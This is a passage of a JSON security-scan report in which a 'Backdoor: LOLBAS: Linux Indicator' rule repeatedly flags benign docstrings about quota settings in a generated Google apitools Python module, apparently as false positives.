                    "text": "      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    variableTermQuotas: Quotas that are active over a specified time period.\n      Only writeable by the producer.\n  \"\"\"\n",
                    "rendered": {
                      "text": "      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    variableTermQuotas: Quotas that are active over a specified time period.\n      Only writeable by the producer.\n  \"\"\"\n",
                      "markdown": "`      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    variableTermQuotas: Quotas that are active over a specified time period.\n      Only writeable by the producer.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2280,
                  "startColumn": 47,
                  "endLine": 2280,
                  "endColumn": 56,
                  "snippet": {
                    "text": "      this map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for\n      quotas defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n",
                    "rendered": {
                      "text": "      this map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for\n      quotas defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n",
                      "markdown": "`      this map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for\n      quotas defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2272,
                  "startColumn": 58,
                  "endLine": 2272,
                  "endColumn": 67,
                  "snippet": {
                    "text": "    effectiveQuotas: The effective quota limits for each group, derived from\n      the service defaults together with any producer or consumer overrides.\n      For each limit, the effective value is the minimum of the producer and\n      consumer overrides if either is present, or else the service default if\n      neither is present. DEPRECATED. Use effective_quota_groups instead.\n    producerOverrides: Quota overrides set by the producer. Note that if a\n      consumer override is also specified, then the minimum of the two will be\n",
                    "rendered": {
                      "text": "    effectiveQuotas: The effective quota limits for each group, derived from\n      the service defaults together with any producer or consumer overrides.\n      For each limit, the effective value is the minimum of the producer and\n      consumer overrides if either is present, or else the service default if\n      neither is present. DEPRECATED. Use effective_quota_groups instead.\n    producerOverrides: Quota overrides set by the producer. Note that if a\n      consumer override is also specified, then the minimum of the two will be\n",
                      "markdown": "`    effectiveQuotas: The effective quota limits for each group, derived from\n      the service defaults together with any producer or consumer overrides.\n      For each limit, the effective value is the minimum of the producer and\n      consumer overrides if either is present, or else the service default if\n      neither is present. DEPRECATED. Use effective_quota_groups instead.\n    producerOverrides: Quota overrides set by the producer. Note that if a\n      consumer override is also specified, then the minimum of the two will be\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2270,
                  "startColumn": 9,
                  "endLine": 2270,
                  "endColumn": 18,
                  "snippet": {
                    "text": "      settings, as a map from quota group name to the effective quota\n      information for that group. Output-only.\n    effectiveQuotas: The effective quota limits for each group, derived from\n      the service defaults together with any producer or consumer overrides.\n      For each limit, the effective value is the minimum of the producer and\n      consumer overrides if either is present, or else the service default if\n      neither is present. DEPRECATED. Use effective_quota_groups instead.\n",
                    "rendered": {
                      "text": "      settings, as a map from quota group name to the effective quota\n      information for that group. Output-only.\n    effectiveQuotas: The effective quota limits for each group, derived from\n      the service defaults together with any producer or consumer overrides.\n      For each limit, the effective value is the minimum of the producer and\n      consumer overrides if either is present, or else the service default if\n      neither is present. DEPRECATED. Use effective_quota_groups instead.\n",
                      "markdown": "`      settings, as a map from quota group name to the effective quota\n      information for that group. Output-only.\n    effectiveQuotas: The effective quota limits for each group, derived from\n      the service defaults together with any producer or consumer overrides.\n      For each limit, the effective value is the minimum of the producer and\n      consumer overrides if either is present, or else the service default if\n      neither is present. DEPRECATED. Use effective_quota_groups instead.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2266,
                  "startColumn": 22,
                  "endLine": 2266,
                  "endColumn": 31,
                  "snippet": {
                    "text": "      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    effectiveQuotaGroups: Use this field for quota limits defined under quota\n      groups. Combines service quota configuration and project-specific\n      settings, as a map from quota group name to the effective quota\n      information for that group. Output-only.\n    effectiveQuotas: The effective quota limits for each group, derived from\n",
                    "rendered": {
                      "text": "      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    effectiveQuotaGroups: Use this field for quota limits defined under quota\n      groups. Combines service quota configuration and project-specific\n      settings, as a map from quota group name to the effective quota\n      information for that group. Output-only.\n    effectiveQuotas: The effective quota limits for each group, derived from\n",
                      "markdown": "`      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    effectiveQuotaGroups: Use this field for quota limits defined under quota\n      groups. Combines service quota configuration and project-specific\n      settings, as a map from quota group name to the effective quota\n      information for that group. Output-only.\n    effectiveQuotas: The effective quota limits for each group, derived from\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2264,
                  "startColumn": 14,
                  "endLine": 2264,
                  "endColumn": 23,
                  "snippet": {
                    "text": "      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    effectiveQuotaGroups: Use this field for quota limits defined under quota\n      groups. Combines service quota configuration and project-specific\n      settings, as a map from quota group name to the effective quota\n",
                    "rendered": {
                      "text": "      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    effectiveQuotaGroups: Use this field for quota limits defined under quota\n      groups. Combines service quota configuration and project-specific\n      settings, as a map from quota group name to the effective quota\n",
                      "markdown": "`      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    effectiveQuotaGroups: Use this field for quota limits defined under quota\n      groups. Combines service quota configuration and project-specific\n      settings, as a map from quota group name to the effective quota\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2261,
                  "startColumn": 47,
                  "endLine": 2261,
                  "endColumn": 56,
                  "snippet": {
                    "text": "      map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for quotas\n      defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n",
                    "rendered": {
                      "text": "      map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for quotas\n      defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n",
                      "markdown": "`      map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for quotas\n      defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2256,
                  "startColumn": 67,
                  "endLine": 2257,
                  "snippet": {
                    "text": "\n  Fields:\n    consumerOverrides: Quota overrides set by the consumer. Consumer overrides\n      will only have an effect up to the max_limit specified in the service\n      config, or the the producer override, if one exists.  The key for this\n      map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for quotas\n      defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n",
                    "rendered": {
                      "text": "\n  Fields:\n    consumerOverrides: Quota overrides set by the consumer. Consumer overrides\n      will only have an effect up to the max_limit specified in the service\n      config, or the the producer override, if one exists.  The key for this\n      map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for quotas\n      defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n",
                      "markdown": "`\n  Fields:\n    consumerOverrides: Quota overrides set by the consumer. Consumer overrides\n      will only have an effect up to the max_limit specified in the service\n      config, or the the producer override, if one exists.  The key for this\n      map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for quotas\n      defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2252,
                  "startColumn": 14,
                  "endLine": 2252,
                  "endColumn": 23,
                  "snippet": {
                    "text": "      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n\n  Fields:\n    consumerOverrides: Quota overrides set by the consumer. Consumer overrides\n",
                    "rendered": {
                      "text": "      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n\n  Fields:\n    consumerOverrides: Quota overrides set by the consumer. Consumer overrides\n",
                      "markdown": "`      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n\n  Fields:\n    consumerOverrides: Quota overrides set by the consumer. Consumer overrides\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2249,
                  "startColumn": 47,
                  "endLine": 2249,
                  "endColumn": 56,
                  "snippet": {
                    "text": "      for this map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for\n      quotas defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n",
                    "rendered": {
                      "text": "      for this map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for\n      quotas defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n",
                      "markdown": "`      for this map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for\n      quotas defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2241,
                  "startColumn": 5,
                  "endLine": 2241,
                  "endColumn": 14,
                  "snippet": {
                    "text": "      from the service defaults together with any producer or consumer\n      overrides. For each limit, the effective value is the minimum of the\n      producer and consumer overrides if either is present, or else the\n      service default if neither is present. DEPRECATED. Use\n      effective_quota_groups instead.\n    ProducerOverridesValue: Quota overrides set by the producer. Note that if\n      a consumer override is also specified, then the minimum of the two will\n",
                    "rendered": {
                      "text": "      from the service defaults together with any producer or consumer\n      overrides. For each limit, the effective value is the minimum of the\n      producer and consumer overrides if either is present, or else the\n      service default if neither is present. DEPRECATED. Use\n      effective_quota_groups instead.\n    ProducerOverridesValue: Quota overrides set by the producer. Note that if\n      a consumer override is also specified, then the minimum of the two will\n",
                      "markdown": "`      from the service defaults together with any producer or consumer\n      overrides. For each limit, the effective value is the minimum of the\n      producer and consumer overrides if either is present, or else the\n      service default if neither is present. DEPRECATED. Use\n      effective_quota_groups instead.\n    ProducerOverridesValue: Quota overrides set by the producer. Note that if\n      a consumer override is also specified, then the minimum of the two will\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2238,
                  "startColumn": 14,
                  "endLine": 2238,
                  "endColumn": 23,
                  "snippet": {
                    "text": "      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    EffectiveQuotasValue: The effective quota limits for each group, derived\n      from the service defaults together with any producer or consumer\n      overrides. For each limit, the effective value is the minimum of the\n      producer and consumer overrides if either is present, or else the\n      service default if neither is present. DEPRECATED. Use\n",
                    "rendered": {
                      "text": "      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    EffectiveQuotasValue: The effective quota limits for each group, derived\n      from the service defaults together with any producer or consumer\n      overrides. For each limit, the effective value is the minimum of the\n      producer and consumer overrides if either is present, or else the\n      service default if neither is present. DEPRECATED. Use\n",
                      "markdown": "`      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    EffectiveQuotasValue: The effective quota limits for each group, derived\n      from the service defaults together with any producer or consumer\n      overrides. For each limit, the effective value is the minimum of the\n      producer and consumer overrides if either is present, or else the\n      service default if neither is present. DEPRECATED. Use\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2236,
                  "startColumn": 14,
                  "endLine": 2236,
                  "endColumn": 23,
                  "snippet": {
                    "text": "      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    EffectiveQuotasValue: The effective quota limits for each group, derived\n      from the service defaults together with any producer or consumer\n      overrides. For each limit, the effective value is the minimum of the\n",
                    "rendered": {
                      "text": "      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    EffectiveQuotasValue: The effective quota limits for each group, derived\n      from the service defaults together with any producer or consumer\n      overrides. For each limit, the effective value is the minimum of the\n",
                      "markdown": "`      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n    EffectiveQuotasValue: The effective quota limits for each group, derived\n      from the service defaults together with any producer or consumer\n      overrides. For each limit, the effective value is the minimum of the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2233,
                  "startColumn": 47,
                  "endLine": 2233,
                  "endColumn": 56,
                  "snippet": {
                    "text": "      for this map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for\n      quotas defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n",
                    "rendered": {
                      "text": "      for this map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for\n      quotas defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n",
                      "markdown": "`      for this map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for\n      quotas defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n      google.api.QuotaLimit.name field from the service config.  For example:\n      'ReadGroup/ProjectDaily'.  - '<LIMIT_NAME>' for quotas defined without\n      quota groups, where LIMIT_NAME is the google.api.QuotaLimit.name field\n      from the service config. For example: 'borrowedCountPerOrganization'.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2229,
                  "startColumn": 5,
                  "endLine": 2229,
                  "endColumn": 14,
                  "snippet": {
                    "text": "  Messages:\n    ConsumerOverridesValue: Quota overrides set by the consumer. Consumer\n      overrides will only have an effect up to the max_limit specified in the\n      service config, or the the producer override, if one exists.  The key\n      for this map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for\n      quotas defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n",
                    "rendered": {
                      "text": "  Messages:\n    ConsumerOverridesValue: Quota overrides set by the consumer. Consumer\n      overrides will only have an effect up to the max_limit specified in the\n      service config, or the the producer override, if one exists.  The key\n      for this map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for\n      quotas defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n",
                      "markdown": "`  Messages:\n    ConsumerOverridesValue: Quota overrides set by the consumer. Consumer\n      overrides will only have an effect up to the max_limit specified in the\n      service config, or the the producer override, if one exists.  The key\n      for this map is one of the following:  - '<GROUP_NAME>/<LIMIT_NAME>' for\n      quotas defined within quota groups, where GROUP_NAME is the\n      google.api.QuotaGroup.name field and LIMIT_NAME is the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2223,
                  "startColumn": 23,
                  "endLine": 2223,
                  "endColumn": 32,
                  "snippet": {
                    "text": "\nclass QuotaSettings(_messages.Message):\n  r\"\"\"Per-consumer overrides for quota settings. See google/api/quota.proto\n  for the corresponding service configuration which provides the default\n  values.\n\n  Messages:\n",
                    "rendered": {
                      "text": "\nclass QuotaSettings(_messages.Message):\n  r\"\"\"Per-consumer overrides for quota settings. See google/api/quota.proto\n  for the corresponding service configuration which provides the default\n  values.\n\n  Messages:\n",
                      "markdown": "`\nclass QuotaSettings(_messages.Message):\n  r\"\"\"Per-consumer overrides for quota settings. See google/api/quota.proto\n  for the corresponding service configuration which provides the default\n  values.\n\n  Messages:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2155,
                  "startColumn": 5,
                  "endLine": 2155,
                  "endColumn": 11,
                  "snippet": {
                    "text": "      for this limit. Therefore, once a limit has been put into use, its name\n      should be immutable. You can use the display_name field to provide a\n      user-friendly name for the limit. The display name can be evolved over\n      time without affecting the identity of the limit.\n  \"\"\"\n\n  class LimitByValueValuesEnum(_messages.Enum):\n",
                    "rendered": {
                      "text": "      for this limit. Therefore, once a limit has been put into use, its name\n      should be immutable. You can use the display_name field to provide a\n      user-friendly name for the limit. The display name can be evolved over\n      time without affecting the identity of the limit.\n  \"\"\"\n\n  class LimitByValueValuesEnum(_messages.Enum):\n",
                      "markdown": "`      for this limit. Therefore, once a limit has been put into use, its name\n      should be immutable. You can use the display_name field to provide a\n      user-friendly name for the limit. The display name can be evolved over\n      time without affecting the identity of the limit.\n  \"\"\"\n\n  class LimitByValueValuesEnum(_messages.Enum):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/servicemanagement_sample/servicemanagement_v1/servicemanagement_v1_messages.py"
                },
                "region": {
                  "startLine": 2111,
                  "startColumn": 41,
                  "endLine": 2111,
